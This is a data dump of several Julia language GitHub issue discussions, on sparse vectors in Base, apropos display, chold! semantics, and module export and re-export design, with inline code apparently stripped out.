julia/JuliaLang/11324,0.058691142,JuliaLang,julia,About SparseVectors,22352,276,165,0,2,"There's been a lot of debate about whether we should incorporate sparse vectors into Julia 0.4. Here are three options  (A) Use SparseMatrixCSC to emulate a sparse vector. This, as many have pointed out in other issues, breaks the consistency with the dense arrays. It is also unnatural and inefficient.  (B) Add SparseVector to base before 0.4 is released.  The functionalities have been developed and tested in SparseVectors.jl. These functionalities are relatively simple and they don't need a long time to get mature. (#8718)  (C) Deprecate sparse vector related functions in Base, and add SparseVector to base after 0.4 is released. (#11323)   Personally, I don't like (A), and I am fine with either (B) or (C). One opinion against (B) is that there can be multiple ways to represent a sparse vector. However, IMHO, the way used in SparseVectors.jl seems to be the most natural way, and it is consistent with both CSC and COO formats. I understand that other formats may be more suitable for certain situations. For such cases, it is not difficult to develop a new sparse vector format (using a different type name of course). cc @friend @friend @friend @friend Since @friend has tagged #8718 as 0.4, and that PR was closed, I tag this as 0.4 in order to make sure that we come to a decision before 0.4 is released.  I am in favour of (B) and to get it all right for 0.4. I don't like just removing the functionality and then adding it again later, which would break codes yet again. This will be an improvement over what already exists, IMO.  Agreed that the implementation in SparseVectors.jl is an improvement over what already exists. Don't take my objection over the maturity and name too seriously if there's a consensus for option (B).  The ""inconsistency"" between dense and sparse arrays doesn't go away by adding a sparse vector type. Even with a sparse vector, there is still no sparse arrays for dimensions higher than two, so I don't buy the consistency argument and therefore also not the ""unnatural"" argument. It might be very useful with a sparse vector type, but I think we should focus of the class of operations that could benefit from a sparse vector type and some performance measures.  Here's your inconsistency argument I'm repeating myself, but I don't care that sparse doesn't generalize yet. But we're doing dimensions 1 and 2, and the operations that result in one from the other, wrong. Let's just fix that for now.  It is these kinds of inconsistencies I don't like, which make the system feel lacking. I wish we had N-d too, but that is likely to happen in JuliaSparse rather than Base. I also feel that a sparse vector will be useful with non-numeric data types as well.  Although, for non-numeric data types, what is the type for fields not represented? The types of sparse arrays and vectors I have implemented (for database use) didn't store null or undefined fields.  For Julia, I guess you'd need type Any, and Nothing.  @friend, the storage for a sparse vector and a 1-column CSC matrix is essentially the same, I don't think there are any performance differences. The argument is that the current semantics are wrong.  I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and .  I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and .  One common sparse vector application  Read in a text corpus document-by-document and train a logistic regression classifier with an L1 penalty on parameters. Your parameter vector is a sparse vector and each new document (of which there should be exactly one in memory at a time) is a sparse vector. The only thing you need to do is compute dot products and update the parameter vector.   The SparseVectors package was initially motivated by the need to represent sparse samples in machine learning applications (@friend's example is an important case). For sparse vectors, we often want to compute dot products, compute distances between them, etc. Matrix-vector product is also very useful.  Looks like, the general opinion is towards option (B). I will make a PR later this week.  Thanks for the examples. I think all of them could work for vectors represented by  sparse matrices. After all, that approach works well in MATLAB, but go ahead with another type. I won't obstruct the process further.  I preface this with the caveat that I do not do sparse linear algebra, but I have been playing with indexing a lot lately.  I've not tried this yet, either. Would it be possible to add a ""phony"" dimensionality to the CSC type, allowing it to pretend to be one or multi-dimensional?  All indexing would be reduced or expanded to its canonical two dimensions.  This will be very inefficient for high dimensional arrays, but it should be fairly easy to make it semantically correct and consistent (especially if we get #10525).  The JuliaSparse organization can provide more specialized types that are more efficient in the non-2-dimensional cases.  Somewhat OT Since SparseVectors have decidedly numeric meaning in Julia (i.e. it is zero values that are removed, instead of null values), how would you name a package for storing efficiently sparse vectors of any type, where many values may be null? [think of JSON arrays, RDBMS rows, etc.]... Does something like that already exist, and I just haven't found it yet?  Thanks!  Scott, check out the DataArrays.jl package. On Tue, May 19, 2015 at 829 AM, Scott P. Jones notifications@friend.com wrote  @friend Nullable types, or DataArrays potentially. @friend that sounds finicky and more complicated than just adding a separate type for 1-d. If we're going to distinguish vectors from matrices within the type system for dense arrays, consistency really demands that we do the same for sparse. Faking it adds complexity to the CSC type, whose internals are already quite commonly used and relied upon not changing in packages. I have an application where I build up a sparse CSC matrix representation column-by-column, often reordering columns but rarely changing their contents. For this, an array-of-SparseVectors is an ideal representation. Representing this as CSC adds overhead for an extra integer field and an extra 2-element integer array for the column pointers for each object, which I'd really rather avoid since my columns have very few nonzeros on average.  @friend, I would love to be able to vcat an array of sparse vectors to get a sparse CSC matrix. I think I'm coming around on this.  hcat, you mean?  Yes, hcat  I'm going to have to disagree with you pretty strongly there. I use sparse matrices very heavily, but I do essentially zero linear algebra with them in Julia. Why? Because Julia's sparse matvec and matmul are still quite a bit slower than doing it in C++ or using MKL's sparse blas extensions, and the sparse factorizations available in Base aren't complete enough for my needs (SuiteSparse has no Bunch-Kaufman indefinite LDL^T). My sparse matrices do have linear (and often custom nonlinear) algebraic meaning, but that gets sent to a compiled solver to do all the actual work. So indexing, reductions, data structure traversal and creation within Julia is really important to me on sparse and structured array types (re #8001). I should send Jiahao an email and see about visiting MIT and working on it for a few weeks leading up to JuliaCon. Eventually Julia will be fast enough to write the solvers themselves - if I can get diagonal-D quasidefinite factorizations from Cholmod to work properly I've been meaning to write a Mehrotra QP solver as a proof-of-concept. Will be interesting to benchmark against Ipopt.  @friend is going to be travelling from now to JuliaCon. I will probably be around MIT a few days before and after JuliaCon - so would love to push on sparse matrix work in any way possible.  @friend The CSC/CSR format is dense in one dimension. It doesn't generalize well to higher dimensions, where you really just want the COO format - representing indices as tuples. I have thought about faking it in CSC, but you just get extra overhead for processing vectors. I would love to make the two representations close enough, so that one can write generic code for iterating through either SparseMatrixCSC or SparseVector.  @friend You can store anything in Julia's sparse data structures already `  @friend What about the following? The problem is that Julia's sparse data structures all have 0 not be represented, but for RDBMS rows, you want NULL to not be represented....  Julia's sparse data structures although not strictly restricted to numeric values, have only been used with numeric values so far. Hence all the rough edges for non-numeric data. This discussion should really be on the mailing list and not here in this issue, where it is off-topic.  Yup, I'm well aware. That's why I called them phony dimensions. My point was just that it might be easiest (as a stopgap) to allow the CSC data structure to masquerade as non-matrices. But perhaps that's naive.  Adding A specific class for sparse vectors is not very difficult. It is largely done in a package, I will try to find some time during the weekend to make a PR.  I'm worried that we're going to go through the same process of finding that all sorts of operations are missing or unusably slow due to using generic fallbacks that went on (is going on?) with sparse matrices for so long. If @friend and @friend are confident that this functionality is complete, then I guess we can merge this into the standard library, but we really need very complete tests for this.  We probably will. The implementation covers enough functionality to be very useful as-is. I don't think Dahua was able to figure out how to get Coveralls turned on yet ( which I have no idea how to help with. It's getting better over time by adding new methods. My nascent idea for a proper generic solution that would be good enough to eventually close #8001 is to extend the cartesian indexing types with a sparsity-aware version, something like , and make the ""generic"" fallbacks use it where appropriate.  What I can make sure is that all methods in SparseVectors.jl (or the PR that would be made later) are implemented in a reasonably efficient manner. However, there are many functions out there that accept AbstractArray but are implemented in a way that assumes fast random access (e.g. for i = 1length(A) ... end), these functions are doomed to work very slowly when called on sparse arrays.  I believe this functionality is useful as is too. We will discover fallbacks to generic implementations, but we are pretty good about fixing them quickly. There is enough time in the 0.4 release cycle to get this 100% right. Let's at least start with a PR.  @friend, it would be pretty easy to add such an iterator for sparse matrices. If you want me to help, just holler.  What about option D) move all sparse matrix/vector stuff into a package? I don't see any advantages of this being in Base despite that its there by default. I really think it would help to decouple the development of these things from Julia itself. (ref #5155)  I have to say, I'm with @friend on this one.  Can we finish precompiled packages first? Then we'll talk about it. For now, let's not break every package in JuliaOpt, kay? Dense linear algebra doesn't need to be in base either. Ignoring sparsity leads to way too much of this nonsense Pretending problem structure isn't important and every problem has all-to-all interactions leads to a crippled framework. Ever notice how there's no such thing as JuliaOpt for Torch?  @friend Why should that break every package in JuliaOpt? One would just have to put a  into packages that require this from 0.4 on. The reason I bring up this here is that the original suggestion of this thread is to put something from a package into base. And in my opinion this is the wrong direction. The designing of libraries should not be done in Base but outside base. So if you are not fine with removing this stuff than let me ask Why should SparseVectors be in base? What is the benefit of this?  I mean, it WILL break everything in JuliaOpt, which we can then work around. How much effort that takes and pain it causes is contingent on how cleanly the excision goes (which is an open question). There's also the issue of precompilation Tony mentioned; I'm not sure how much an external SparseArrays package would add to our load time. The question is whether that burden is outweighed by the potential gains of removing sparse matrices from Base for 0.4.  We have various syntax changes in 0.4, why should a removal of some code matter more? This is Julia master, it should not be used for production use and thus a breakage of packages is a very natural thing during a dev cycle. The point of moving things into a package is that the maintainability is increased and further any improvement that is done is directly available to users that use stable versions of Julia. In my research lab we rely on stable Julia and thus cannot benefit from any improvement that has been made to the sparse matrix code since 0.3 has been release. If it would be in a package this unnatural coupling would be broken. Regarding the load time I don't see why sparse matrices should be more special than other packages. Note that I do use sparse matrices in a large Julia code base, so I will be equally effected.  This is a bugfix. Read the entire thread, this is fixing a semantic inconsistency in the way the current sparse matrix implementation interacts with 1-dimensional indexing. Sparse matrices are far too large, important, and widely used to consider removing before 0.4. We're already months behind schedule, let's not make it any worse. Considering this has gone poorly every time we've tried it, I have serious reservations about doing this again until we work out how to do it more smoothly. For one thing I've suggested leaving functionality in base but moving it into independent modules instead of exporting it by default, which would leave the functionality still available but behind an import, and cause a much easier-to-deal-with breakage in packages.  @friend @friend, I was on the fence about including sparse vectors in Base, but really this addresses a significant usability and semantics issue with the current implementation, and better yet there's already code to do so and @friend is willing to push through a PR. Agreed with @friend. Let's make the incremental improvement now and not create a huge new time sink for everyone to deal with.  Precompilation will be addressed in time, more significant is what consequences saying ""sparse matrices are not important enough to worry about in base"" would have to the package version of sparse matrices being able to work well at all. If base Julia ignores the existence of sparse matrices and writes all routines in a way that they can only ever be efficient for dense matrices, that will be crippling. You need to rewrite all of LinAlg, every reduction, all of broadcast, all indexing and concatenation over again for every sparse matrix type. And again, squared, for all conversions and linear algebra operations between different types. We need a better framework in base first, for which SparseMatrixCSC can be the first implementation - ideally a small, pluggable one that could live out in a package, but the framework needs to exist first.  This attitude is what I object to. We had this ongoing steady stream of broken sparse matrix stuff for a long time. We are past the point where it's acceptable to have that in Base ‚Äì we're trying to get rid of that kind of thing; it's certainly shouldn't be adding more of.  Stefan, I don't understand why you think it's suddenly fixed. It isn't yet.  It's better than it used to be and I object to introducing more half-baked functionality into base.  @friend, I think @friend's proposed PR is already or can be brought to a state that's not half baked before merging.  This isn't half-baked. Things have only gotten better by gradual improvement. Which this is a case of.  Why should being to large be an argument for not moving it in a package? Importance and widely used are pretty subjective. In my subjective opinion PyPlot is a lot more important and widely used than the sparse module. If I understand Tony correctly there will be major overhaul for the sparse module in the future (e.g. generalization to CSR matrices...) and in my opinion there is no benefit of having this development in base. It will make the development even much harder than if it would be developed in a package. Or does nobody see this point?  @friend, I agree with you and have stated before that CSR shouldn't be developed in base, but that's not related to this PR. Sparse vectors aren't a major overhaul, they're a bugfix.  @friend This is not a PR yet but a question how to proceed. If you all want this than simply go ahead and do it. The reason I started this discussion is to show the advantages of this being in a package. And I still have not seen an argument why it would be a bad thing.  We agree with you on everything except timeframe, and maturity of the code removal process. 0.4 shouldn't be removing any more code. 0.4 should also stop adding code that isn't fixing bugs for that matter, and try to get out the door before fall. The bug here is  returns a 1-column matrix instead of a 1-d vector, if there's a way to fix that bug before 0.4 without adding a new type or introducing some ugly fragile workarounds (#11323), speak up. #8718 was on Viral's personal wishlist to get into 0.4 for some time. There's also a non-negligible risk of the sparse code bitrotting and losing a lot of visibility if it gets moved out of base. Sparse matrices will need the right infrastructure to exist in base first (which will have to be developed here) before they can work well as a package, and just as importantly they will need enough people to maintain them or they will wither and die.   Timeframe will always be bad Removing the package is an equally valid bugfix ;-)  This is where I object to. If there is not enough momentum to maintain this then the code is simply not important and should definitely not be in base. Visibility loss is also something which can be said about almost every package and we need other mechanisms to highlight ""must have"" packages.  Completely wrong. The perfect time to make major, significant, breaking reorganizations and changes is early in a -dev cycle. We're not early in a -dev cycle, we're overdue for determining scope completion to close the -dev cycle to move to -pre and a release. We've blown past the 6 months for -dev then 3 months in -pre plan already. Not until a replacement is available, tested, and working. And Base is capable of supporting that package working at all. We're way off topic, but the counterargument to that is how few commits to base are necessary to make use of this type of code once it's there and in place. Miles, Iain, etc have very few base commits, but their packages are a major driver of adoption. If Julia has a single killer app right now where it's undoubtedly better than the competition, it's OR, which you can't do at all without sparse matrices. Let's not cause major breakage there by deleting code without preparing a replacement first.  I think this is the core point of Tony's argument and it's completely accurate from what I can see.  Yes you are right, I agree with that These discussions always end up with a statement that we are off topic. But where if not here should these discussions happen? I did not say first remove it and then do the package. Of course the order is the other way around.  But you are probably right that doing the package is a little bit more complicated due to the binary dependencies. If these were not there it would be a simple copy of the  directory into a new git repo  @friend  What is OR? Does OR require a package? If yes where would be the issue if an additional package is loaded?    OR = operations research, aka optimization, so JuMP, Convex, MathProgBase, the solver bindings, and to some extent Optim. Yes these require an external package, and it probably wouldn't be the end of the world to add an additional dependency package to the mix, BUT, it needs to be done right. It's not yet clear to me, as things stand right now, if taking sparse matrices out of base wholesale can leave both parts working as well together as they did before moving them.  We all want the same thing here, but I don't find the proposal to block a bugfix in favor of a major reorganization as we're trying to finish up 0.4 very convincing. @friend has put his valuable time and effort into developing sparse vectors, and we all have better things to spend our time on than dealing with the fallout of removing everything sparse from Base.  Reading this thread in retrospect taking into account Virals change in the milestone hopefully shows that it could be a good move to decouple the sparse array development from Julia...  @friend there's still no particularly clean way of both fixing the indexing inconsistency bug with SparseVectors as a package while also avoiding massive package breakage or name conflicts by trying to move sparse matrices wholesale into packages. If you would like to start doing the work to prepare package migrations for some of the functionality that's in base right now, please go ahead and start helping do some of that work.  I request not bringing off-topic discussions into issues. I also do not see how this conclusion is drawn - but this is a discussion to be had elsewhere. If you do wish to continue this discussion, I suggest the mailing list or an appropriate issue.  Can this be closed in light of ",99,28,688,0,0,540,23,n,
julia/JuliaLang/12989,0.049460256,JuliaLang,julia,Improve apropos display,4316,36,22,0,0,"Currently, apropos' output is quite simple ‚Äî it's just the objects whose docstrings match the search text It might be nice to make this display a bit richer. We could additionally print out the first non-code documentation line to the edge of the screen, e.g., It also might be nice to make it return a Julia type that simply contains an array of objects and their documentation, so IJulia and other non-REPL programs can format it a little nicer or linkify the text for full documentation.  This does have the downside of making the display non-incremental, making it feel a little slower, but it may be worth it. The implementation is also quite simple and should be fairly simple to extend.  I'd like to take this up. Some questions/remarks Currently, in 0.3, apropos(""pearson"") prints this while in 0.4, apropos seems to have been removed entirely. What are the most important functions and files I will need to read / modify, and which branch should I work in?  @friend you'll have to update.  was very recently reintroduced.  @friend Oh, I was on a 7 days old master. Updating now - thanks!  I agree that enriching the  by providing a good indication as to what the found objects are/do is desirable.  However, after studying and playing with Docs.jl and company, I'm concerned that addressing this issue might be easier said than done, possibly leading to confusing or misleading results The Good  and the new Documentation facilities strike me as extremely well designed, providing a solid foundation for development.   nicely sifts through (loaded) module's  information for matches to its target.  It has available both the keys (objects) and values (object documentation) of these matches but, currently ""merely"" prints the keys.  So the information needed to implement this improvement is right where it needs to be, which seems pretty good. The Complicated  There is almost an embarrassment of riches in the object documentation available to  (but currently unused).  It is difficult to know how to consistently extract an appropriate summary from the available information. Looking at the object documentation for  and  in , @friend 's suggestion is quite reasonable.  Just dig through the object documentation,  select the right Markdown structure and (if needed) truncate it for brevity. However the situation may be different in the future.  Looking at a recent version of Master So it looks as if the documentation for objects (generic functions in particular) may be getting rewritten to better fit with the new documentation system, with an emphasis on providing information on how to use representative methods of generic functions rather than on providing generic documentation of the function.  A naive implementation of the improvement to apropos might look good in the current release but show, rather unhelpfully, in a recent Master I suppose that one approach would be to look through the object documentation to print the text in the vicinity of (one of) the matches to the  search target. Any suggestions on how to proceed?  Do we need to rethink this improvement in the light of how Julia object documentation appears to be developing?  Does it make sense to leave  be (it is simple, robust and effective) and consider developing a different tool for more in-depth exploration and presentation of Julia objects?  A feature rich apropos-like tool that (optionally) works across all installed/registered modules could be quite cool, but that might be best developed as a module.  Since my last comment, I've learned a bit more about the structure of object documentation and now feel that enhancing  will be easier than I had thought.  This change of attitude comes with the realization that generic function documentation is ordered in a reasonable way, making it easy to identify the most generic definition of a function.  (Confusingly to me, the doc macro presents function definitions from more specific to less, which is what made my examination of the  documentation disheartening.) So I know how to easily retrieve the most generic definition of a function.  What's the hold-up to solving this issue and having a cooler  command?  It's truncating this definition, which is typically Markdown, for presentation.  I don't yet know how to do that.  Does anyone have any suggestions? ",18,1,121,0,0,63,7,n,
julia/JuliaLang/1374,0.02169562,JuliaLang,julia,chold! doesn't act as expected,9120,129,58,0,0,"As I understand it,  is supposed to return an in-place  it outputs such a type, but its value stays as . Also, only the upper diagonal elements are changed, the lower diagonal elements are those of the original matrix.  It's not possible to change the type of something in-place, so the behavior expecting isn't actually feasible. Perhaps this is an indication that  simply shouldn't exist since its behavior can't be made to match that of its non-in-place counterpart.  cc @friend  ""its value stays as an array"" CholeskyDense is a composite of two objects, and Array and a Bool. In that output, you're seeing those two components (note the ""true"" at the end). What's possibly confusing is that that CholeskyDense is designed to act as a decomposition of A, in other words be interchangeable for A when used in linear algebra. For example In other words, this test shows that it's working as intended. If you want the Cholesky factor, used factors(C). Or just call chol(C).  Ah, clever. So the  version basically uses the input array as a computational scratchpad but returns the decomposition still.  I get the decomposition thing---that's really quite useful---I guess I just expected  to have the same result as .  I see your point, and it's a good one. (It took me a little to understand that was probably your thinking, sorry about that.) But as Stefan said, it's not possible. I guess ! also means ""caution!"" in this context -). ! is actually pretty ambiguous some functions have ""dummy"" inputs that really serve as outputs, for others (like sort!) they are genuine inputs and the output is returned in them, and yet others just use their inputs as scratch space. I have wondered about using chold!! on occasion, but in the end any naming convention will break down for functions that have multiple inputs and do different things to them. I just noticed that your comments also point out that chold! is not quite working in place. The call to Lapack is in-place, but then it's calling triu or tril which creates a new matrix. So we have the worst of all worlds, it destroys the input but it also allocates a new matrix, which therefore doesn't really represent a savings. I just pushed a fix for this issue.  So does that mean  won't need to create a new array in memory? If so, that's very handy.  Correct.  Indeed, I should say that C = chold!(A, true) also doesn't create a new array in memory. I would be tempted to rename it. I'm not sure (others could tell you with certainty), but I wonder if having variables change type in the middle of a function is less-than-ideal programming practice from the standpoint of making life easy on the compiler.  It depends. If  is just an identifier, in  you're binding something new to it so it's as if you've really called it  and you call it that for the rest of its scope (which if I understand correctly is conversion to a static single assignment (SSA) representation.) Compilers figure that out. This is different than mutating the value of  into something with a different type, which is what the hypothetical side-effectful  would have to do. As Stefan mentions, that can't be done, since the type of a value can't be changed. Note that I was very careful to completely avoid the word ""variable.""  An alternative would be to use a type to indicate that an object is allowed to be destroyed The exclamation mark could then be reserved for functions that do in-place modifications such as .  That's not a bad idea. I'm a bit used to knowing that ! means I'd better read the documentation on a function, so I don't think this is essential, but it might mean fewer trips to the docs. That certainly has merit. What do others think?  My attitude was much like yours, @friend.  The  in the function name is a sign of danger in that the function can modify its arguments.  That's why almost all the functions in the Blas and Lapack modules have names ending in . To me it is a sign to the casual user that such functions should be avoided.  The expert user who has read the docs can employ such functions to overwrite arrays thereby saving storage and enhancing performance but they should not complain about subtle bugs in their code introduced by the contents of arrays being changed. So I think that the  means, ""you better read the docs carefully before using this function"".  Yes, I think you're right about the  indicating danger, and hence requiring the user to read the documentation. But not all functions that destroy their arguments do (and can) have exclamation marks (Although maybe this example is a bit far-fetched.)  Right. That's a different but related convention, which is that when you give constructors an array, they ""own"" it. Of course, this is to avoid having to make copies of everything, but it can definitely be a usability issue.  As an inner constructor the function  must have the same name as the type so the only way to insert a  in the name is to change the name of the type as well.  Although we expect that it will be very rare to call the inner constructor for a templated class directly, all the other constructors do end up calling the inner constructor eventually.  Thus we are left with the option of mangling the name of the type, potentially confusing some users, or forcing a copy of the argument in the inner constructor.  The latter choice would mean that all such objects would cause a copy of the matrix, which is a situation I would like to avoid.  I would prefer to provide the ability to modify the array in place if the programmer so chooses. All the Factorization types eventually call Lapack subroutines to generate the decomposition.  These subroutines always overwrite some of their arguments, hence the option for overwriting is available.  Saving memory allocation and garbage collection by overwriting is not important when dealing with arrays with tens or hundreds of elements.  It is important when dealing with arrays having tens or hundreds of millions of elements.  I write code that performs iterative optimization of parameters in models that can have matrices of this size in their representation and these arrays need to be updated at each evaluation of the objective function.  I really want to do that updating in place.  In fact, in the R code for these models that I currently have available, I go to a lot of trouble and complication linking compiled code with R code and passing objects that should not be modified but are, exactly to allow for in-place updating.  In early versions of that code (the lme4 package for R) users had the experience of getting models fit and then having R fail because it is unable to allocate memory to construct the object to be returned from the model-fitting function.  In other words, the results were calculated but could not be returned because of a copy operation. They weren't happy.  I think David's point is that you could, if you chose, have the following behavior CholeskyDense{Float64}(A, true) makes a copy of A (so doesn't destroy it). In contrast, CholeskyDense{Float64}(destroy(A), true) does not copy of A, because you've marked A as being something you don't care about preserving, and uses A for its storage of the decomposition. However, I agree with Stefan it's probably a good convention that when you pass things to a constructor, you're passing control of them to the new object. I think I follow that pretty naturally in my coding, but I suppose this is yet another chance to ask whether we need more documentation.  @friend, that's indeed what I meant. The convention of passing control of the arguments in a type constructor to the type does seem to make a lot of sense, however. Adding Destroy methods everywhere would probably be too verbose.  If I have a triangular matrix, is there a way to construct a  instance? As I understand it, the constructor only accepts the full matrix, and then computes the Cholesky decomposition. But what if I already have the Cholesky decomposition computed? This could be useful for sampling from Wishart (and inverse Wishart) distributions, which can be done via a Bartlett decomposition.  @friend At present the  constructors perform the decomposition.  You could always create a  object of the appropriate size as, say,  then replace the matrix as Actually, now that I think of it there is no need to match the size of the matrix used to create Lapack.potrs!‚ô† directly if you want to solve systems of the form LL'x=b  @friend Regarding adding Destroy methods everywhere, I think it make much more sense to call  than to try to do a lot of gymnastics within a function to have  work.  @friend Thanks. You can actually call , and then replace it with a larger matrix to save having to compute the Cholesky of the identity. However, perhaps it would be better if the constructor for  didn't compute the Cholesky at all i.e. calls to  would take the triangular matrix as the argument. You could transfer the computation to the  function, or use ? This would have the benefit of being consistent with some of the other  types, such as  and .  Actually, I just realised  isn't a subtype of  why is that? ",39,0,289,0,0,164,16,n,
julia/JuliaLang/17948,0.107507068,JuliaLang,julia,Provide a way to make the exported symbols of a package available under qualified names and to not make private symbols available,9537,105,64,0,2,"Currently, when importing libraries in Julia, one cannot selectively import only the exported symbols of a package without bringing those symbols into the global scope.  This is often not wanted, and indeed the equivalent in C++ () is often recommended against.  use  @friend That doesn't do what I want.  Consider these two files in the same directory Test1.jl Test2.jl This outputs 2.  I am looking for something that I can use instead of , such that  the first print expression will succeed (because module  will have been brought into scope) the second print expression will fail (because  has not been exported).  That is, I want  qualified access to the module's public API no access to the module's implementation details.    provides a  macro that does this kind of thing  There was some recent discussion about how the state of issues around modules and namespacing didn't reflect the general interest in improving them. I've reopened this and added a ""modules"" label for such issues.  It would be nice to import two or more modules that share one or more exported symbols and designate which module is to be used when all or some of the symbol[s] are used without a module name prefixed (and then when used, not to have warnings about overwriting the so-dominated symbols generated).  @friend that's a good point, but to me there is a world of difference between qualified and unqualified names. A lot of care absolutely must go into how  by itself is resolved. @friend I don't believe the analogy to  is correct;  does not bring all of its symbols into the global namespace, only the symbol . I can certainly appreciate why people don't want lots of names dumped into their namespace. But by the time you've written , why not just give the value of, well, ? In this case I subscribe to the ""we're all consenting adults here"" attitude. To restrict this, we'd be going to a lot of trouble just to slap you on the wrist and prevent you from accessing something. For example, how would you debug the module, e.g. test  interactively? I'm against complexity that only serves to prevent me from doing things.  The problem is that ""import"" treats exported and non-exported symbols identically.  If I type , I don't know if  is part of the public interface of  or just an implementation detail. On Aug 12, 2016 158 PM, ""Jeff Bezanson"" notifications@friend.com wrote  I agree it is good to know which is which.  will tell you just the exported names in a module. Currently tab completion shows all names, but I think it would be good to have a setting to only tab-complete exported names. Documentation also helps; it would be good for  to show a list of exported names, especially if the package lacks documentation.  I would also like an easy way for this to be enforced at runtime. On Aug 12, 2016 424 PM, ""Jeff Bezanson"" notifications@friend.com wrote  @friend Yes, I agree.  My perspective was forward -- resolving APIs, however they may become done.  It seems there needs to be an active way to assert dominance (in the form of how unqualified names are resolved when there is more than one qualified form available).  Maybe there is another way to express this API is a refinement of the that one.  Maybe there is a better way -- this one I noticed.  @friend That would awesome! My preference is that we should hand-hold users more on the documentation side than on the runtime side. I like that Julia separates nonexported functions from exported ones, but doesn't hide them completely.  It's entirely possible that a post-1.0 version of Julia will add access controls that allow some degree of enforced encapsulation, but preventing people from doing things is not a high priority for 1.0.  I am not particularly interested in mandatory encapsulation.  I am more interested in making it easier to avoid using private functions, without polluting the global namespace. On Aug 18, 2016 935 AM, ""Stefan Karpinski"" notifications@friend.com wrote  I'm confused by your statement ‚Äì¬†how is that interest not satisfied currently?  Currently, there is no way to get access to the public symbols of a module without either injecting them into your scope or making them appear indistinguishable (as far as the consuming code appears) from symbols that are merely implementation details.  So when you write ,  will get  whether it is public or not.  But if you write , then the only difference between exported and non-exported symbols is that , if exported, is injected into your global scope. I don't need for the abstraction barrier to be airtight.  But I do want it to be obvious when I am using something I probably have no business accessing. Perhaps this can be done by convention have a convention that private symbols are in inner modules whose name starts with an underscore, say. On Aug 18, 2016 442 PM, ""Stefan Karpinski"" notifications@friend.com wrote  While I like the Python convention of prefixing private members of classes and modules with an underscore due to its simplicity it is not very aesthetically pleasing ;-) What is missing is a mechanism that allows one to import a single name but only if it is part of the public interface of the module, e.g. like shown below  I have thought it felt a little backwards that  is more conservative than , since the latter allows extension. (Compared to just  which is less conservative than  due to bringing in the exports.) More behavioral distinction between the two might make it a little more obvious when to use one vs the other.  is also less conservative than  which does not feel right.  One option would be a way to declare some symbols as private.  Getting access to them would require reflection (say On Aug 19, 2016 1032 AM, ""Helge Eichhorn"" notifications@friend.com wrote  I like the idea of restricting  to only import exported symbols.  When it comes to qualified access to members of a module if we ever get  overloading then it could be natural to let  work, but require  with a .  If access restriction is ever being added, would it be out of scope to add a more complex rights management in order to disable the IO part (and maybe others independently) of julia? (in order to make it a fully virtual runtime w/o any reality interaction and thus having a ""save"" environment) Concrete reason would be that i'd really love to be able to ""outsource"" parts of a program that i've written so that a user can manipulate it (crazy example i've written a multiplayer game and want to provide access to some underlying methods in order to change behaviour of some things in a pretty complex way, like manipulating the weather based on ingame events) But i obviously neither want any user to be able to shutdown nor misuse the server (for like running a DOS or sending viruses) I know there a a lot of other ways (depending on the situation/use case) to realize such a game, like writing a DSL, doing a whole AST check for ""invalid"" calls (that would be my solution if i had to solve it right now, similar to Reflection/SecurityManagers in Java) or doing the ""calculations"" clientside and only communicate by keywords (thus simply restricting what is considered senseful on the server) But i'm always happy to be lead to even more creative/prettier/faster or otherwise better solutions. That's just my 2 cents for the restriction idea. As i said, it's not about time but about scope (are there chances that julia will ever support such a use case)  A more thorough capability or access control system is definitely a bigger problem. A library for launching missiles will export its  function since that's the entry point, but that doesn't mean everybody is allowed to launch missiles. This issue is really only about convenience, making it easier to avoid depending on private functions. For those purposes it's ok if there are workarounds like , but for real security the goal is to make it as close to impossible to launch the missiles as you can.  Agreed. For security, you really want a microservices approach with an audited / verified kernel.  o/t, but cloudabi has some really neat ideas with capability based security there  cloudabi is Windows averse It is nice of them to allow others to use their relatively more secure versions of the cloudabi, 'nix zeitgiest apps and these other commonly used packages autoconf, automake, bash, bison, boost, buddy, bzip2, c-runtime, cairo, cairomm, cloudabi-reexec, cloudabi, cloudlibc, cmake, compiler-rt, coreutils, curl, cxx-runtime, diffutils, expat, findutils, flac, flex, freetype, fribidi, gawk, gettext, giflib, glib, gmpUpgr, grep, help2man, icu4c, jasper, jpeg, json-c, lcms2, libarchive, libatomic-ops, libcroco, libcxx, libcxxabi, libebml, libevent, libexif, libffi, libgcrypt, libgpg-error, libid3tag, libksba, libmad, libmatroska, libmngRena, libogg, libpng, libressl, libsamplerate, libsigcxx, libsndfile, libsodium, libtasn1, libtheora, libtomcrypt, libtomfloat, libtommath, libtompoly, libtool, libunwind, libvorbis, libwebp, libxml2, libxslt, libxspf, llvm, lua, lz4, lzo, m4, make, memcached, mpfr, nettle, ninja, nspr, openjpeg, opus, pcre, pcre2, picosat, pixman, pkgconf, python, qpdf, re2, sed, snappy, speex, speexdsp, taglib, texinfo, tiff, tomsfastmath, uriparser, x265, xz, yaml, zlib  In Common Lisp,  can only access exported symbols, while  is for all symbols. It worked well. Too bad  already has a meaning.  could be reclaimed. There's also  which is already deprecated in 0.6 and will be fully available in 1.0.  As far as I can tell, this is a dup of  Yes, looks very much like a dup. ",36,77,369,0,0,151,5,n,
julia/JuliaLang/1986,0.334216535,JuliaLang,julia,Re-exporting one module's symbols from another,10954,165,64,0,1,"It would be convenient if there were a way to do this. Doing this explicitly (copy the long list of exports from A into B) is a bit ugly and error prone. I imagine any alternative would involve a new keyword though. Concretely, Gadfly is useless without symbols from Compose (and probably DataFrames), but a bunch of compulsory using statements isn't great.  Actually, I would propose altering export's semantics to make this work  This is a very good point. I've taken to doing  at the start of any new package code that has DataFrames as a requirement.  My suggestion would be , which would re-export the exported names of  (but not the unexported names!).  A potential downside is that it may make discovery of exported names a bit harder. Also, I'm disinclined to support reserving another name . So, alternatively, something like  perhaps? Or  (a module name followed by a period)?  seems weird to me (and if you are willing to add a  keyword, why not ?), but  seems fine to me if a bit subtle. I don't understand your concern about discovery of exported names; could you clarify?  Currently, it easy to parse any julia file, search for  at the start of an expression, and interpret the comma-separated list that follows to quickly identify the public interface for a module. ‚ô†using ... as ... with reexportusing`, not a new keyword  I see, you are worried about manually parsing for exports.  It's not too bad with , though‚Äîyou just need to do the same thing recursively for each . If you are wedded to , I would tend to just support .  I'm just tossing around other proposals for consideration. Very likely, none of them are inherently better. I didn't mean to imply the  part was required.  or  or  would all be 